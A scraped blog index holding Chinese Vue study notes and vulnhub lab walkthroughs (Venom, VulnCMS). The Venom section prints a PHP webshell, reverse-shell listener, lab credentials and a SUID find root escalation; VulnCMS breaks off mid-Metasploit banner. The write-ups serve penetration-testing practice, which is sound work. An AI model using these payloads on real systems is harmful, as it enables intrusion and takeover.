插槽(Slot)是vue为组件的封装者提供的能力。允许开发者在封装组件时，把不确定、希望由用户指定的部分定义为插槽 vue官方规定：每一个slot插槽，都要有一个 name 名称 如果省略了slot的 name 属性，则有一个默认名称叫做default 默认情况下，在使用组件的时候，提供的内容都会被填充到名称为default 的插槽之中 v-slot指令 1. 如果要把内容填充到指定名称的插槽中，需要使用v-slot: 这个指令 2. v-slot: 后面要跟上插槽名称 3. v-slot: 指令不能直接用在元素身上，必须用在template标签上 4. template是一个虚拟的标签，只起到包裹性质的作用，但是，不会被渲染为任何实质性的 html 元素 5. v-slot: 指令的简写形式是 # 后备内容 + 封装组件时，可以为预留的插槽提供后备内容（默认内容）。如果组件的使用者没有为插槽提供任何内容，则后备内容会生效 具名插槽 作用域插槽 在封装组件时，为预留的提供属性对应的值，这种做法叫做“作用域插槽”","categories":[{"name":"vue","slug":"vue","permalink":"http://example.com/categories/vue/"}],"tags":[],"author":"Dokey_"},{"title":"vue-day06","slug":"vue-day06","date":"2021-11-22T12:43:27.000Z","updated":"2023-03-25T14:35:06.463Z","comments":true,"path":"63889.html","link":"","permalink":"http://example.com/63889.html","excerpt":"","text":"vue-day06 私有自定义指令 如何创建自定义指令 定义并使用自定义指令 注意+ 当指令第一次被绑定到元素上的时候会立即触发bind函数 + 形参中的el表示当前指令所绑定到的这个DOM对象 update函数 + bind函数只调用一次：当指令第一次绑定到元素时调用，当DOM更新时bind函数不会被触发。update函数会在每次DOM更新时被调用 函数简写 如果bind和update函数中的逻辑完全相同，则对象格式的自定义指令可以简写成函数格式 全局自定义指令 全局共享的自定义指令需要通过”Vue.directive()”进行声明 eslintp168","categories":[{"name":"vue","slug":"vue","permalink":"http://example.com/categories/vue/"}],"tags":[],"author":"Dokey_"},{"title":"vue-day04","slug":"vue-day04","date":"2021-10-25T07:29:00.000Z","updated":"2023-03-25T14:35:06.458Z","comments":true,"path":"14352.html","link":"","permalink":"http://example.com/14352.html","excerpt":"","text":"vue-day04组件之间的样式冲突问题 默认情况下，写在.vue组件中的样式会全局生效，因此很容易造成多个组件之间的样式冲突问题 导致组件之间样式冲突的根本原因是： 单页面应用程序中，所有组件的DOM结构，都是基于唯一的index.html页面进行呈现的 每个组件中的样式，都会影响整个index.html页面中的DOM元素 + 通过scoped来解决样式冲突 + 当使用第三方组件库的时候，如果有修改第三方组件默认样式的需求，需要用到 &#x2F;deep&#x2F; 组件的生命周期 生命周期是指一个组件从创建 &#x3D;&gt; 运行 &#x3D;&gt; 销毁的整个阶段，强调的是一个时间段 组件生命周期函数的分类 created 生命周期函数 经常在created中调用methods中的方法，请求服务器的数据，并且把请求到的数据转存到data中，供template模板渲染的时候使用 mounted 生命周期函数 操作页面DOM结构可在mounted函数中进行 updated 生命周期函数 当数据变化之后，为了能够操作到最新的 DOM 结构，必须把代码写到 updated 生命周期函数 组件之间的数据共享 自定义属性：props来接收父向子传递过来的数据 子组件向父组件传值 兄弟组件之间的数据共享 在vue 2.x中，兄弟组件之间数据共享的方案时EventBus EventBus 的使用步骤 1.创建eventBus.js模块，并向外共享一个Vue实例对象 2.在数据发送方，调用bus.$emit(‘事件名称’，要发送的数据)方法触发自定义事件 3.在数据接收方，调用bus.$on(‘事件名称’，事件处理函数)方法注册一个自定义事件 ref引用 组件的$nextTick(cb)方法，会把cb推迟到下一个DOM更新周期之后执行。通俗的理解是：等组件的DOM更新完成之后，再执行cb回调函数，从而保证cb回调函数可以操作到最新的DOM元素 tips forEach循环一旦开始，无法在中间被停止 arr.some(){} 可在中间停止循环，节省性能 判断数组中水果是否被全选可用arr.every() reduce()累加器使用方法","categories":[{"name":"vue","slug":"vue","permalink":"http://example.com/categories/vue/"}],"tags":[],"author":"Dokey_"},{"title":"vue-day03","slug":"vue-day03","date":"2021-10-20T02:09:36.000Z","updated":"2023-03-25T14:35:06.460Z","comments":true,"path":"64081.html","link":"","permalink":"http://example.com/64081.html","excerpt":"","text":"vue-day03 vue运行流程：通过main.js把App.vue渲染到index.html的指定区域中 其中： 1. app.vue用来编写待渲染的模板结构 2. index.html中需要预留一个el区域 3. main.js把App.vue渲染到了index.html所预留的区域中 vue项目中src目录的构成 assets 文件夹：存放项目中用到的静态资源文件。例如：css样式表、图片资源 components文件夹：自己封装的、可复用的组件 main.js 是项目的入口文件，整个项目的运行，要先执行main.js 组件化开发 组件化开发：根据封装的思想，把页面上可重用的UI结构封装为组件，从而方便项目的开发和维护 vue组件的三个组成部分 template &#x3D;&gt; 组件的模板结构 script &#x3D;&gt; 组件Javascript行为 style &#x3D;&gt; 组件的样式 使用组件的三个步骤 使用import语法导入需要的组件2.使用components节点注册组件3.以标签形式使用刚才注册的组件 通过components注册的是私有子组件 注册全局组件 在vue项目中的main.js入口文件中，通过Vue.component()方法，可以注册全局组件 组件的props props是组件的自定义属性，在封装通用组件的时候，合理地使用props可以极大的提高组件的复用性 props是只读的 + props的default默认值 + props的type值类型 + props的required必填项校验","categories":[{"name":"vue","slug":"vue","permalink":"http://example.com/categories/vue/"}],"tags":[],"author":"Dokey_"},{"title":"vue-day02","slug":"vue-02","date":"2021-10-19T02:08:32.000Z","updated":"2023-03-25T14:35:06.456Z","comments":true,"path":"14992.html","link":"","permalink":"http://example.com/14992.html","excerpt":"","text":"vue-day02 vue过滤器 过滤器函数必须被定义到filters节点之下（私有过滤器），过滤器本质上是一个函数，过滤器中一定要有一个返回值；过滤器函数形参中的val永远都是”管道符”前面那个值。 字符串有charAt()方法，这个方法接收索引值，表示从字符串中把索引对应的字符获取出来 字符串的slice方法可以截取字符串，从指定索引往后截取 全局过滤器 如果全局过滤器和私有过滤器一致，此时按照”就近原则”，调用的是”私有过滤器” 连续调用过滤器 侦听器 watch侦听器 所有侦听器，都应该被定义到watch节点下 侦听器本质上是一个函数，要监视哪个数据的变化，就把数据名作为方法名即可 对象格式watch侦听器 immediate选项的默认值是false immediate的作用是：控制侦听器是否自己触发一次 深度侦听 通过deep参数开启深度监听，只要对象中任何一个属性变化了都会触发”对象的侦听器” 如果要侦听的是对象的子属性的变化（info.username），则必须包裹一层单引号 计算属性 所有计算属性都要定义到computed节点之下 计算属性在定义的时候，要定义成”定义格式” axios 专注于网络请求的库","categories":[{"name":"vue","slug":"vue","permalink":"http://example.com/categories/vue/"}],"tags":[],"author":"Dokey_"},{"title":"vulnhub-Venom","slug":"vulnhub-Venom","date":"2021-07-31T14:35:00.000Z","updated":"2023-03-25T14:35:06.470Z","comments":true,"path":"64974.html","link":"","permalink":"http://example.com/64974.html","excerpt":"","text":"记录打靶机（Venom）过程参考： https://nepcodex.com/2021/06/venom-walkthrough-vulnhub-writeup/ https://grumpygeekwrites.wordpress.com/2021/06/20/vulnhub-venom-walk-through-tutorial-writeup/ 主机发现使用arp-scan进行存活IP探测 1234567891011sudo arp-scan 192.168.109.0/24[sudo] password for kali: Interface: eth0, type: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.109.2 00:50:56:f0:a1:15 VMware, Inc.192.168.109.1 00:50:56:c0:00:08 VMware, Inc.192.168.109.147 00:0c:29:90:08:c7 VMware, Inc.192.168.109.254 00:50:56:f8:89:68 VMware, Inc.4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 1.930 seconds (132.64 hosts/sec). 4 responded 经探测可知目标IP为192.168.109.147，接下来对此IP进行端口扫描，尝试获取更多信息 端口扫描1234567891011121314151617181920212223242526272829303132333435363738394041nmap -sC -sV -p- 192.168.109.147 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 09:08 EDTNmap scan report for 192.168.109.147Host is up (0.00032s latency).Not shown: 65530 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.380/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)443/tcp open ssl/https Apache/2.4.29 (Ubuntu)|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Host: VENOM; OS: UnixHost script results:|_clock-skew: mean: 6h09m59s, deviation: 3h10m31s, median: 7h59m58s|_nbstat: NetBIOS name: VENOM, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: venom| NetBIOS computer name: VENOM\\x00| Domain name: \\x00| FQDN: venom|_ System time: 2021-07-29T02:38:46+05:30| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-07-28T21:08:46|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.02 seconds 经扫描可知目标开放了21（ftp）、80（http）、139（smb）、443（https）、445（smb）等多个端口。 整理一下思路针对不同端口： ftp（21）端口： 尝试匿名用户登录 打岔 ✘ * 漏洞数据库搜索相关版本漏洞，此处版本过高暂没有利用漏洞 打岔 ✘ http（80）端口： 读取源码，尝试获取敏感信息 ✔（此处在做的过程中没有仔细查看，漏掉重要突破口） smb（139、445）端口： 可以尝试使用MSF中ms 07-010进行漏洞探测 ✗ * 枚举SMB服务 ✔ https（443）端口 此端口暂没有什么思路 以上思路经过验证并参考大神思路后得知突破口在http（80）端口 目录扫描12345678910111213141516171819202122dirb http://192.168.109.147:80/ -----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Sat Jul 31 11:10:45 2021URL_BASE: http://192.168.109.147:80/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.109.147:80/ ----+ http://192.168.109.147:80/index.html (CODE:200|SIZE:11004) + http://192.168.109.147:80/server-status (CODE:403|SIZE:280) -----------------END_TIME: Sat Jul 31 11:10:48 2021DOWNLOADED: 4612 - FOUND: 2 经扫描index.html返回200，此页面是Ubuntu LogoApache2 Ubuntu Default Page，所以当时没想到查看源码，淦。在源码结尾藏有一段MD5加密的字符串： 解码经解密后得到hostinger,参考网上思路后得知需要枚举SMB服务，小笔记记下，因为对445端口做信息收集还是第一次 枚举SMB服务参考网上使用enum4linux进行枚举 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157enum4linux -a 192.168.109.147Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 28 09:18:59 2021 ========================== | Target Information | ========================== Target ........... 192.168.109.147RID Range ........ 500-550,1000-1050Username ......... &#x27;&#x27;Password ......... &#x27;&#x27;Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ======================================================= | Enumerating Workgroup/Domain on 192.168.109.147 | ======================================================= [+] Got domain/workgroup name: WORKGROUP =============================================== | Nbtstat Information for 192.168.109.147 | =============================================== Looking up status of 192.168.109.147 VENOM &lt;00&gt; - B &lt;ACTIVE&gt; Workstation Service VENOM &lt;03&gt; - B &lt;ACTIVE&gt; Messenger Service VENOM &lt;20&gt; - B &lt;ACTIVE&gt; File Server Service ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Master Browser WORKGROUP &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Domain/Workgroup Name WORKGROUP &lt;1d&gt; - B &lt;ACTIVE&gt; Master Browser WORKGROUP &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Browser Service Elections MAC Address = 00-00-00-00-00-00 ======================================== | Session Check on 192.168.109.147 | ======================================== [+] Server 192.168.109.147 allows sessions using username &#x27;&#x27;, password &#x27;&#x27; ============================================== | Getting domain SID for 192.168.109.147 | ============================================== Domain Name: WORKGROUPDomain Sid: (NULL SID)[+] Can&#x27;t determine if host is part of domain or part of a workgroup ========================================= | OS information on 192.168.109.147 | ========================================= Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.[+] Got OS info for 192.168.109.147 from smbclient: [+] Got OS info for 192.168.109.147 from srvinfo: VENOM Wk Sv PrQ Unx NT SNT venom server (Samba, Ubuntu) platform_id : 500 os version : 6.1 server type : 0x809a03 ================================ | Users on 192.168.109.147 | ================================ Use of uninitialized value $users in print at ./enum4linux.pl line 874.Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.Use of uninitialized value $users in print at ./enum4linux.pl line 888.Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890. ============================================ | Share Enumeration on 192.168.109.147 | ============================================ Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers IPC$ IPC IPC Service (venom server (Samba, Ubuntu))SMB1 disabled -- no workgroup available[+] Attempting to map shares on 192.168.109.147//192.168.109.147/print$ Mapping: DENIED, Listing: N/A//192.168.109.147/IPC$ [E] Can&#x27;t understand response:NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* ======================================================= | Password Policy Information for 192.168.109.147 | ======================================================= [+] Attaching to 192.168.109.147 using a NULL share[+] Trying protocol 139/SMB...[+] Found domain(s): [+] VENOM [+] Builtin[+] Password Info for Domain: VENOM [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: 37 days 6 hours 21 minutes [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: 37 days 6 hours 21 minutes [+] Retieved partial password policy with rpcclient:Password Complexity: DisabledMinimum Password Length: 5 ================================= | Groups on 192.168.109.147 | ================================= [+] Getting builtin groups:[+] Getting builtin group memberships:[+] Getting local groups:[+] Getting local group memberships:[+] Getting domain groups:[+] Getting domain group memberships: ========================================================================== | Users on 192.168.109.147 via RID cycling (RIDS: 500-550,1000-1050) | ========================================================================== [I] Found new SID: S-1-22-1[I] Found new SID: S-1-5-21-3525385883-4254613925-43684688[I] Found new SID: S-1-5-32[+] Enumerating users using SID S-1-5-21-3525385883-4254613925-43684688 and logon username &#x27;&#x27;, password &#x27;&#x27;...skip...[+] Enumerating users using SID S-1-22-1 and logon username &#x27;&#x27;, password &#x27;&#x27;S-1-22-1-1000 Unix User\\nathan (Local User)S-1-22-1-1002 Unix User\\hostinger (Local User) ================================================ | Getting printer info for 192.168.109.147 | ================================================ No printers returned.enum4linux complete on Wed Jul 28 09:19:14 2021 经过枚举可以发现hostinger是使用者之一，结合之前解密的MD5值进行ftp登录 ftp登录123456789101112131415161718192021222324252627ftp 192.168.109.147Connected to 192.168.109.147.220 (vsFTPd 3.0.3)Name (192.168.109.147:kali): hostinger331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x 2 1002 1002 4096 May 21 23:43 files226 Directory send OK.ftp&gt; cd files250 Directory successfully changed.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 0 0 384 May 21 23:43 hint.txt226 Directory send OK.ftp&gt; get hint.txtlocal: hint.txt remote: hint.txt200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for hint.txt (384 bytes).226 Transfer complete.384 bytes received in 0.04 secs (10.3970 kB/s) 可以登录成功，可以发现files目录下存在hint.txt，下载下来查看内容 123456789101112 Hey there... T0D0 --* You need to follow the &#x27;hostinger&#x27; on WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= also aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=* some knowledge of cipher is required to decode the dora password..* try on venom.boxpassword -- L7f9l8@J#p%Ue+Q1234 -&gt; deocode this you will get the administrator password Have fun .. :) 在hint.txt中存在两段base64编码的字符串 Base64 解码12345echo &#x27;WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=&#x27; | base64 -d | base64 -d | base64 -dstandard vigenere cipher ┌──(kali㉿kali)-[~/Desktop]└─$ echo &#x27;aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=&#x27; | base64 -d https://cryptii.com/pipes/vigenere-cipher 第一段需要解码4次，第二段解码为一个网址 整理信息： 解码bash64得到相关信息 盒子主机名为venom.box1You need to follow the &#x27;hostinger&#x27; on standard vigenere cipher also https://cryptii.com/pipes/vigenere-cipher 添加主机名到主机文件中，访问域名可得到新的页面，此处参考另一种思路，在https://cryptii.com/pipes/vigenere-cipher可以解密得到dora的密码 登录venom.box此处可以看到版本信息为Subrion CMS 4.2.1在exploit-db中搜索可以得到该版本存在一个文件上传漏洞 漏洞利用通过构造一句话木马上传后以获得shell，根据提示可以得知因为该版本中.htaccess文件中忽略了 .pht、 .phar文件后缀的文件 12cat php-shell.phar &lt;?php system($_GET[cmd]); ?&gt; 成功执行命令 获取shell通过前面上传的一句话木马执行python反向连接shell此时需要监听4444 端口 123456nc -lvp 4444 1 ⨯listening on [any] 4444 ...connect to [192.168.109.140] from venom.box [192.168.109.147] 33098$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data) 成功获取shell此时是在upload目录的切换到home目录下查看存在用户 123456789cd /homecd /home$ ls -lartls -larttotal 16drwxr-xr-x 24 root root 4096 May 20 10:08 ..drwxr-xr-x 4 root root 4096 May 21 17:00 .drwxr-x--- 17 nathan nathan 4096 May 22 00:21 nathandrwxr-xr-x 16 hostinger hostinger 4096 May 22 13:58 hostinger 使用hostinger/hostinger登录，登录成功后在/var/www/html/subrion/backup下.htaccess文件中存在nathan密码 切换nathan用户，可获取第一个flag 12345678910111213141516su nathansu nathanPassword: FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_anathan@venom:/var/www/html/subrion/backup$ ididuid=1000(nathan) gid=1000(nathan) groups=1000(nathan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)nathan@venom:/var/www/html/subrion/backup$ cd cd nathan@venom:~$ lslsDesktop Downloads Music Public user.txtDocuments examples.desktop Pictures Templates Videosnathan@venom:~$ cat user.txtcat user.txtW3_@r3_V3n0m:P 权限提升尝试sudo提权 123456789sudo -l sudo -l Matching Defaults entries for nathan on venom: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nathan may run the following commands on venom: (root) ALL, !/bin/su (root) ALL, !/bin/su 参考得知这里直接运行sudo bash即可提权 1234567891011121314sudo -l sudo -l Matching Defaults entries for nathan on venom: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nathan may run the following commands on venom: (root) ALL, !/bin/su (root) ALL, !/bin/sunathan@venom:~$ sudo bashsudo bashroot@venom:~# ididuid=0(root) gid=0(root) groups=0(root) 第二种方式通过查找设置了SUID位的文件find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051nathan@venom:~$ find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/nullfind / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null-rwsr-xr-x 1 root root 1473576 Apr 20 10:15 /opt/VBoxGuestAdditions-6.1.20/bin/VBoxDRMClient-rwsr-s--- 1 root nathan 238080 Nov 5 2017 /usr/bin/find-rwsr-xr-x 1 root root 22520 Mar 27 2019 /usr/bin/pkexec-rwsr-xr-x 1 root root 44528 Mar 23 2019 /usr/bin/chsh-rwsr-xr-x 1 root root 59640 Mar 23 2019 /usr/bin/passwd-rwsr-xr-x 1 root root 22528 Jun 28 2019 /usr/bin/arping-rwsr-xr-x 1 root root 75824 Mar 23 2019 /usr/bin/gpasswd-rwsr-xr-x 1 root root 18448 Jun 28 2019 /usr/bin/traceroute6.iputils-rwsr-xr-x 1 root root 40344 Mar 23 2019 /usr/bin/newgrp-rwsr-xr-x 1 root root 76496 Mar 23 2019 /usr/bin/chfn-rwsr-xr-x 1 root root 149080 Jan 31 2020 /usr/bin/sudo-rwsr-xr-x 1 root root 10232 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-x 1 root root 436552 Mar 4 2019 /usr/lib/openssh/ssh-keysign-rwsr-xr-- 1 root messagebus 42992 Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 14328 Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1-rwsr-sr-x 1 root root 10232 Jul 3 2020 /usr/lib/xorg/Xorg.wrap-rwsr-xr-x 1 root root 113528 Jul 10 2020 /usr/lib/snapd/snap-confine-rwsr-xr-- 1 root dip 378600 Jul 23 2020 /usr/sbin/pppd-rwsr-xr-x 1 root root 43088 Mar 5 2020 /bin/mount-rwsr-xr-x 1 root root 26696 Mar 5 2020 /bin/umount-rwsr-xr-x 1 root root 44664 Mar 23 2019 /bin/su-rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount-rwsr-xr-x 1 root root 64424 Jun 28 2019 /bin/ping-rwsr-xr-x 1 root root 43088 Sep 17 2020 /snap/core18/2066/bin/mount-rwsr-xr-x 1 root root 64424 Jun 28 2019 /snap/core18/2066/bin/ping-rwsr-xr-x 1 root root 44664 Mar 23 2019 /snap/core18/2066/bin/su-rwsr-xr-x 1 root root 26696 Sep 17 2020 /snap/core18/2066/bin/umount-rwsr-xr-x 1 root root 76496 Mar 23 2019 /snap/core18/2066/usr/bin/chfn-rwsr-xr-x 1 root root 44528 Mar 23 2019 /snap/core18/2066/usr/bin/chsh-rwsr-xr-x 1 root root 75824 Mar 23 2019 /snap/core18/2066/usr/bin/gpasswd-rwsr-xr-x 1 root root 40344 Mar 23 2019 /snap/core18/2066/usr/bin/newgrp-rwsr-xr-x 1 root root 59640 Mar 23 2019 /snap/core18/2066/usr/bin/passwd-rwsr-xr-x 1 root root 149080 Jan 19 2021 /snap/core18/2066/usr/bin/sudo-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11 2020 /snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 436552 Mar 4 2019 /snap/core18/2066/usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 43088 Mar 5 2020 /snap/core18/1885/bin/mount-rwsr-xr-x 1 root root 64424 Jun 28 2019 /snap/core18/1885/bin/ping-rwsr-xr-x 1 root root 44664 Mar 23 2019 /snap/core18/1885/bin/su-rwsr-xr-x 1 root root 26696 Mar 5 2020 /snap/core18/1885/bin/umount-rwsr-xr-x 1 root root 76496 Mar 23 2019 /snap/core18/1885/usr/bin/chfn-rwsr-xr-x 1 root root 44528 Mar 23 2019 /snap/core18/1885/usr/bin/chsh-rwsr-xr-x 1 root root 75824 Mar 23 2019 /snap/core18/1885/usr/bin/gpasswd-rwsr-xr-x 1 root root 40344 Mar 23 2019 /snap/core18/1885/usr/bin/newgrp-rwsr-xr-x 1 root root 59640 Mar 23 2019 /snap/core18/1885/usr/bin/passwd-rwsr-xr-x 1 root root 149080 Jan 31 2020 /snap/core18/1885/usr/bin/sudo-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11 2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 436552 Mar 4 2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 110792 Jul 11 2020 /snap/snapd/8542/usr/lib/snapd/snap-confine-rwsr-xr-x 1 root root 111080 Apr 24 17:35 /snap/snapd/11841/usr/lib/snapd/snap-confine 这里参考网上思路，使用find进行提权并读取第二个flag 1234567891011121314151617$ pwdpwd/home/nathan$ /usr/bin/find . -exec /bin/sh -p \\; -quit /usr/bin/find . -exec /bin/sh -p \\; -quit# ididuid=1000(nathan) gid=1000(nathan) euid=0(root) groups=1000(nathan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)# cd /root/cd /root/# lslsroot.txt snap# cat root.txtcat root.txt#root_flagH@v3_a_n1c3_l1fe. done 总结 不够细心 没有清晰的渗透步骤，脑子太乱 坚持","categories":[],"tags":[],"author":"Dokey_"},{"title":"vulnhub-VulnCMS","slug":"vulnhub-VulnCMS","date":"2021-07-27T16:42:27.000Z","updated":"2023-03-25T14:35:06.479Z","comments":true,"path":"10746.html","link":"","permalink":"http://example.com/10746.html","excerpt":"","text":"记录打靶机（VulnCMS）过程信息探测主机发现使用arp-scan进行主机IP发现，探测网段中目标主机IP地址。 1234567891011sudo arp-scan 192.168.109.0/24[sudo] password for kali: Interface: eth0, type: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.109.1 00:50:56:c0:00:08 VMware, Inc.192.168.109.2 00:50:56:f0:a1:15 VMware, Inc.192.168.109.145 00:0c:29:da:98:92 VMware, Inc.192.168.109.254 00:50:56:f8:89:68 VMware, Inc.4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 1.938 seconds (132.09 hosts/sec). 4 responded 经探测发现目标IP地址为192.168.109.145，接着使用nmap对该IP地址进行端口扫描 端口扫描 123456789101112131415161718192021222324252627282930313233343536sudo nmap -sC -sV -p- 192.168.109.145[sudo] password for kali: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 12:43 EDTNmap scan report for 192.168.109.145Host is up (0.0014s latency).Not shown: 65530 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8c:9f:7e:78:82:ef:76:f6:26:23:c9:52:6d:aa:fe:d0 (RSA)| 256 2a:e2:f6:d2:52:1c:c1:d0:3d:aa:40:e6:b5:08:1d:45 (ECDSA)|_ 256 fa:c9:eb:58:e3:d2:b7:4a:74:77:fc:69:0e:b6:68:08 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: W3.CSS Template5000/tcp open http nginx 1.14.0 (Ubuntu)|_http-generator: WordPress 5.7.2|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: fsociety &amp;#8211; Just another WordPress site8081/tcp open http nginx 1.14.0 (Ubuntu)|_http-generator: Joomla! - Open Source Content Management| http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Home9001/tcp open http nginx 1.14.0 (Ubuntu)|_http-generator: Drupal 7 (http://drupal.org)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: fsociety.webMAC Address: 00:0C:29:DA:98:92 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.84 seconds 经nmap扫描后发现存在22（ssh）、80（http）、5000（http）、8081（http）、9001（http）因为此靶机除了22（ssh）端口以外其他都是http服务相关的，在漏洞数据库搜索了openssh 7.6后显示存在一个用户名爆破漏洞，但是用处应该不大，因为还需要密码；翻找了其他http服务相关的页面无可用信息（这里主要使用的是目录扫描）。 但是可以从nmap扫描信息中看到在9001端口运行了Drupal 7服务，之前做相关靶机学习时得知此服务存在exp，这里可以使用msfconsole框架进行搜索加载相关exp。这里有点问题，在做的时候因为用错了exp始终无法返回shell，后面参考了网络上相关文章，此处应该使用exploit/unix/webapp/drupal_drupalgeddon2。 漏洞利用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677msfconsole `:oDFo:` ./ymM0dayMmy/. -+dHJ5aGFyZGVyIQ==+- `:sm⏣~~Destroy.No.Data~~s:` -+h2~~Maintain.No.Persistence~~h+- `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:` ./etc/shadow.0days-Data&#x27;%20OR%201=1--.No.0MN8&#x27;/. -++SecKCoin++e.AMd` `.-://///+hbove.913.ElsMNh+- -~/.ssh/id_rsa.Des- `htN01UserWroteMe!- :dopeAW.No&lt;nano&gt;o :is:TЯiKC.sudo-.A: :we&#x27;re.all.alike&#x27;` The.PFYroy.No.D7: :PLACEDRINKHERE!: yxp_cmdshell.Ab0: :msf&gt;exploit -j. :Ns.BOB&amp;ALICEes7: :---srwxrwx:-.` `MS146.52.No.Per: :&lt;script&gt;.Ac816/ sENbove3101.404: :NT_AUTHORITY.Do `T:/shSYSTEM-.N: :09.14.2011.raid /STFU|wall.No.Pr: :hevnsntSurb025N. dNVRGOING2GIVUUP: :#OUTHOUSE- -s: /corykennedyData: :$nmap -oS SSo.6178306Ence: :Awsm.da: 